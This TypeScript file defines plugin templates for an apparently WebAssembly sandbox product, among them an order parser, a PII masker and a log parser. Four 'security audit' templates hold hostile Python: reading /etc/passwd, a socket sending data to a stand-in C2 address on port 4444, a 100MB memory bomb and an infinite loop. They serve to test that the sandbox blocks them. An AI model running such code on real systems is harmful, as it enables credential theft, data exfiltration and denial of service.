import type { PluginTemplate } from '../types';

export const PLUGIN_TEMPLATES: PluginTemplate[] = [
  {
    id: 'erp_order_parser',
    title: 'Proprietary Order & ERP Parser',
    category: 'data_parser',
    description: 'Parses proprietary raw enterprise order payloads, calculates sales taxes, normalizes currency, and formats standardized line items.',
    code: `"""
WasmBox Plugin: Enterprise ERP Data Parser
Author: Acme Global Data Team
Sandbox Constraints: Max 10MB RAM | No Filesystem Access | No Sockets
"""
import json

def transform(raw_payload):
    """
    Standardizes enterprise inbound order events into normalized ERP format.
    Runs inside isolated WebAssembly sandbox in under 3 milliseconds.
    """
    # Parse inbound customer payload
    data = json.loads(raw_payload) if isinstance(raw_payload, str) else raw_payload
    
    order_id = data.get("orderId", "ORD-UNKNOWN")
    raw_items = data.get("items", [])
    
    formatted_items = []
    subtotal = 0.0
    
    for item in raw_items:
        qty = int(item.get("quantity", 1))
        unit_price = float(item.get("price", 0.0))
        line_total = round(qty * unit_price, 2)
        subtotal += line_total
        
        formatted_items.append({
            "sku": item.get("sku", "SKU-GEN").upper(),
            "product": item.get("name", "Unknown Product"),
            "quantity": qty,
            "unitPriceUsd": round(unit_price, 2),
            "lineTotalUsd": line_total
        })
    
    tax_rate = 0.0825  # 8.25% state tax
    tax_amount = round(subtotal * tax_rate, 2)
    grand_total = round(subtotal + tax_amount, 2)
    
    return {
        "status": "PROCESSED_BY_WASM_SANDBOX",
        "orderId": order_id,
        "engine": "Wasmtime-MicroPython-v1.4",
        "financials": {
            "subtotal": subtotal,
            "taxRate": tax_rate,
            "taxAmount": tax_amount,
            "grandTotal": grand_total,
            "currency": "USD"
        },
        "itemCount": len(formatted_items),
        "items": formatted_items
    }
`,
    defaultInput: JSON.stringify({
      orderId: "ORD-2026-98421",
      customer: "Global Logistics Corp",
      timestamp: "2026-08-26T14:20:00Z",
      currency: "USD",
      items: [
        { sku: "srv-edge-4u", name: "Edge Server Node 4U", quantity: 2, price: 1450.00 },
        { sku: "sfp-opt-10g", name: "10GbE SFP+ Transceiver", quantity: 8, price: 65.50 },
        { sku: "cbl-dac-2m", name: "Direct Attach Copper Cable 2m", quantity: 4, price: 28.00 }
      ]
    }, null, 2)
  },
  {
    id: 'pii_sanitizer',
    title: 'PII & PCI-DSS Financial Masker',
    category: 'anonymizer',
    description: 'Detects and redacts sensitive Social Security Numbers (SSNs), Credit Card Numbers, and email addresses from customer support transcripts.',
    code: `"""
WasmBox Plugin: PII & Financial Sanitizer
Compliance: HIPAA & PCI-DSS Grade In-Memory Tokenizer
"""
import re
import json

def mask_text(text):
    # Mask Social Security Numbers (XXX-XX-XXXX)
    text = re.sub(r'\\b\\d{3}-\\d{2}-\\d{4}\\b', '***-**-****', text)
    # Mask Credit Cards (16-digit PANs)
    text = re.sub(r'\\b(?:\\d{4}[ -]?){3}\\d{4}\\b', '****-****-****-****', text)
    # Mask Email addresses
    text = re.sub(r'([a-zA-Z0-9_.+-]+)@[a-zA-Z0-9-]+\\.[a-zA-Z0-9-.]+', r'\\1[REDACTED]@domain.com', text)
    return text

def transform(input_data):
    """
    Sanitizes arbitrary payloads while preserving data structure.
    """
    if isinstance(input_data, str):
        try:
            parsed = json.loads(input_data)
            return json.loads(mask_text(json.dumps(parsed)))
        except:
            return mask_text(input_data)
    return input_data
`,
    defaultInput: JSON.stringify({
      ticketId: "SUP-78190",
      customerName: "Eleanor Vance",
      ssn: "987-65-4321",
      creditCardNumber: "4532-8821-9901-4412",
      billingEmail: "eleanor.vance@enterprise-corp.com",
      notes: "Customer authorized credit card charge 4532-8821-9901-4412 for license renewal. Verified SSN 987-65-4321."
    }, null, 2)
  },
  {
    id: 'log_parser',
    title: 'High-Throughput Log Parser',
    category: 'data_parser',
    description: 'Fast streaming log line analyzer that extracts HTTP status codes, latencies, and categorizes error rates.',
    code: `"""
WasmBox Plugin: High-Throughput Log Stream Formatter
"""
def transform(log_stream):
    lines = log_stream.strip().split("\\n")
    parsed_events = []
    error_count = 0
    
    for idx, raw_line in enumerate(lines):
        line = raw_line.strip()
        if not line:
            continue
            
        is_error = "ERROR" in line or "500" in line or "CRITICAL" in line
        if is_error:
            error_count += 1
            
        parsed_events.append({
            "lineIndex": idx + 1,
            "severity": "ERROR" if is_error else "INFO",
            "message": line,
            "charLength": len(line)
        })
        
    return {
        "totalLines": len(parsed_events),
        "errorCount": error_count,
        "health": "CRITICAL" if error_count > 2 else "HEALTHY",
        "events": parsed_events
    }
`,
    defaultInput: `2026-08-26 10:14:02.102 [INFO] GET /api/v1/auth/token - 200 OK (2.1ms)
2026-08-26 10:14:02.158 [INFO] POST /api/v1/data/sync - 200 OK (14.2ms)
2026-08-26 10:14:02.890 [ERROR] Connection refused to upstream DB replica (10.0.4.12:5432)
2026-08-26 10:14:03.001 [WARN] Retrying connection attempt 2/3...
2026-08-26 10:14:03.240 [INFO] Connection re-established successfully`
  },
  {
    id: 'audit_fs_passwd',
    title: '🚨 Security Audit: Read /etc/passwd',
    category: 'security_audit',
    isAuditAttempt: true,
    description: 'Malicious attack vector attempting to read host server /etc/passwd. Tests WASI capability denial.',
    code: `"""
🚨 PENETRATION TEST: Host Filesystem Breach
Objective: Attempt to open and read server /etc/passwd
Expected Result: Blocked with SEC_WASM_FS_BLOCKED / WASI_ERRNO_NOTCAPABLE
"""
def transform(data):
    print("[ATTACK] Attempting to break out of WASM sandbox and open /etc/passwd...")
    
    try:
        # Malicious exploit attempt: Host file descriptor request
        with open('/etc/passwd', 'r') as f:
            secret_data = f.read()
            return {"status": "PWNED", "data": secret_data}
    except Exception as e:
        print(f"[TRAPPED] Filesystem access denied by WasmBox sandbox: {e}")
        raise e
`,
    defaultInput: JSON.stringify({ attack: "fs_read_passwd" }, null, 2)
  },
  {
    id: 'audit_net_socket',
    title: '🚨 Security Audit: Network Socket Exfiltration',
    category: 'security_audit',
    isAuditAttempt: true,
    description: 'Malicious attack vector attempting to open a TCP socket connection to exfiltrate data to an external IP.',
    code: `"""
🚨 PENETRATION TEST: Outbound Network Exfiltration
Objective: Attempt to initiate TCP socket connection to external C2
Expected Result: Blocked with SEC_WASM_NET_BLOCKED / WASI_ERRNO_NOTCAPABLE
"""
import socket

def transform(data):
    print("[ATTACK] Attempting to open raw TCP socket to remote IP 198.51.100.4:4444...")
    
    # Malicious exploit attempt: Socket creation & connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('198.51.100.4', 4444))
    s.sendall(b"exfiltrated_tenant_secrets")
    
    return {"status": "EXFILTRATED"}
`,
    defaultInput: JSON.stringify({ attack: "net_socket_c2" }, null, 2)
  },
  {
    id: 'audit_mem_bomb',
    title: '🚨 Security Audit: 100MB Memory Bomb',
    category: 'security_audit',
    isAuditAttempt: true,
    description: 'Malicious memory bomb attempting to allocate 100MB RAM to crash the host server.',
    code: `"""
🚨 PENETRATION TEST: Memory Exhaustion Denial-of-Service
Objective: Attempt to allocate 100MB of heap memory (exceeding 10MB quota)
Expected Result: Blocked with SEC_WASM_OOM_BLOCKED
"""
def transform(data):
    print("[ATTACK] Allocating 100MB string in heap...")
    # 100 Megabytes allocation
    bomb = "A" * (100 * 1024 * 1024)
    return {"status": "ALLOCATED", "length": len(bomb)}
`,
    defaultInput: JSON.stringify({ attack: "oom_bomb" }, null, 2)
  },
  {
    id: 'audit_cpu_dos',
    title: '🚨 Security Audit: Infinite CPU Loop',
    category: 'security_audit',
    isAuditAttempt: true,
    description: 'Malicious infinite loop attempting to peg host CPU threads. Tests Wasmtime instruction fuel limiter.',
    code: `"""
🚨 PENETRATION TEST: CPU Resource Starvation
Objective: Run unyielding infinite loop
Expected Result: Blocked with SEC_WASM_FUEL_EXHAUSTED (50,000 instruction limit)
"""
def transform(data):
    print("[ATTACK] Entering infinite loop to exhaust CPU fuel...")
    counter = 0
    while True:
        counter += 1
    return {"status": "LOOP_FINISHED", "count": counter}
`,
    defaultInput: JSON.stringify({ attack: "infinite_loop" }, null, 2)
  }
];
